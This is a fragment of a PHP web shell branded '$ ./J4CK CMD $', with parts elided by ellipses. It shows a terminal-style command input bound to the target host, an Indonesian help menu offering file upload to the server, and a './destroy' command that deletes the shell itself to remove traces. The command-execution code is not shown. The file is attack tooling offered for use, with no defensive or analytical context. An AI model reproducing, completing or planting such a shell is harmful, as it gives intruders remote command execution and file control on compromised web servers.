...
<html>
<head>
	<title>$ ./J4CK CMD $</title>
	<meta charset="utf-8">
	<meta name="author" content="./J4CK">
</head>
<body>
...
<div class="content">
<div id="head">
<center><a href="?" style="text-decoration: none;color: #eee"><h1>$ ./J4CK CMD $</h1></a></center>
<hr>
</div>
<?php
...
if($cmd == "--help" || $cmd == "-h")
{
$help = array("./upl" => "Untuk mengunggah file ke server.",
			  "./destroy" => "Untuk menghapus file ini. (".$_SERVER['PHP_SELF'].") ");

echo "[+] Addtional command [./J4CK CMD] <br><br>";
foreach($help as $h=>$k)
{
...
{
	?>J4CK@<?=$_SERVER['HTTP_HOST'];?> $<input type="text" name="command" placeholder="What can i do for u? --help" id="command" style="width:80%" onchange="s57_runCommand(this.value)">
<?php
}else{
